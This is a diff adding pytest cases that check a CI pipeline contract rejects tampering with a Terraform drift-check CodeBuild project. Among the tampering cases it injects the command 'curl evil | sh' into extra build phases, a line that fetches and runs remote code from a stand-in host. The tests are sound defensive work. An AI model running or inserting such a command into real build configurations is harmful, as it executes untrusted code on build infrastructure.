@@ -161,3 +161,82 @@ def test_the_drift_role_is_an_allowed_reader_of_its_roots_secret_only(tpl):
     with pytest.raises(AssertionError, match="demo-drift-github can read github's"):
         c.assert_applies_plan(tpl, ROOTS[1], "demo", drift=False)
     assert GH
+
+
+# --- PR #8 review: the drift project held to exactly the construct's, more than 5 roots --------
+
+
+def _spec_edit(edit, name="network"):
+    def change(res):
+        p = _drift(res, name)
+        spec = json.loads(p["Source"]["BuildSpec"])
+        edit(spec)
+        p["Source"]["BuildSpec"] = json.dumps(spec)
+    return change
+
+
+def _rules(res, pred):
+    return [r["Properties"] for r in res.values() if r["Type"] == "AWS::Events::Rule" and pred(r["Properties"])]
+
+
+def _var(name, value):
+    return lambda r: _drift(r)["Environment"]["EnvironmentVariables"].append(
+        {"Name": name, "Type": "PLAINTEXT", "Value": value})
+
+
+@pytest.mark.parametrize(
+    "change,message",
+    [
+        (_spec_edit(lambda s: s["phases"].__setitem__("install", {"commands": ["curl evil | sh"]})),
+         "phases besides build"),
+        (_spec_edit(lambda s: s["phases"].__setitem__("post_build", {"commands": ["curl evil | sh"]})),
+         "phases besides build"),
+        (_spec_edit(lambda s: s["phases"]["build"].__setitem__("finally", ["curl evil | sh"])),
+         "build phase has extra settings"),
+        (_var("TF_CLI_ARGS_plan", "-refresh=false"), "environment differs"),
+        (lambda r: [v.__setitem__("Value", "other-bucket") for v in _drift(r)["Environment"]["EnvironmentVariables"]
+                    if v["Name"] == "TF_STATE_BUCKET"], "environment differs"),
+        (lambda r: _drift(r)["Source"].__setitem__("Location", "https://github.com/someone/else.git"),
+         "checks out https://github.com/someone/else.git"),
+        (lambda r: _drift(r).__setitem__("SourceVersion", "feature/unreviewed"), "checks out 'feature/unreviewed'"),
+        (lambda r: _drift(r).pop("SourceVersion"), "checks out None"),
+        (lambda r: _drift(r)["Source"].pop("Auth"), "pipeline's connection"),
+        (lambda r: [p.__setitem__("State", "DISABLED") for p in _rules(r, lambda p: "ScheduleExpression" in p)],
+         "not started by a schedule"),
+        (lambda r: [p.__setitem__("State", "DISABLED") for p in _rules(r, lambda p: "EventPattern" in p)],
+         "failures are not published"),
+        (lambda r: [p.__setitem__("Targets", []) for p in _rules(r, lambda p: "EventPattern" in p)],
+         "failures are not published"),
+        (lambda r: [p["EventPattern"]["detail"].__setitem__("build-status", ["FAILED"])
+                    for p in _rules(r, lambda p: "EventPattern" in p)], "failures are not published"),
+    ],
+)
+def test_the_drift_project_is_exactly_the_constructs(change, message):
+    with pytest.raises(AssertionError, match=message):
+        c.assert_standard_contract(mutated(change), post_deploy=[POST], repo=REPO, gates=GATES,
+                                   terraform=ROOTS, drift=True)
+
+
+def test_more_than_five_roots_get_drift_checks():
+    roots = [TerraformRoot(f"r{i}", name=f"r{i}") for i in range(7)]
+    from specter_pipeline.presets import terraform_gates
+
+    gates = terraform_gates(roots=[r.path for r in roots])
+    t = build(application_stage=None, terraform=roots, gates=gates, drift_schedule=CRON)
+    c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=gates, terraform=roots, drift=True)
+
+
+def test_a_root_named_like_another_roots_drift_project_is_not_confused():
+    from specter_pipeline.presets import terraform_gates
+
+    roots = [TerraformRoot("a", name="main"), TerraformRoot("b", name="drift-main")]
+    gates = terraform_gates(roots=["a", "b"])
+    t = build(application_stage=None, terraform=roots, gates=gates, drift_schedule=CRON)
+    c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=gates, terraform=roots, drift=True)
+
+
+def test_failures_say_which_root_and_where_to_look(tpl):
+    (rule,) = [r["Properties"] for r in tpl.find_resources("AWS::Events::Rule").values()
+               if "EventPattern" in r["Properties"] and "'github'" in r["Properties"]["Description"]]
+    template = rule["Targets"][0]["InputTransformer"]["InputTemplate"]
+    assert "'github'" in template and "<detail-build-status>" in template and "<detail-build-id>" in template
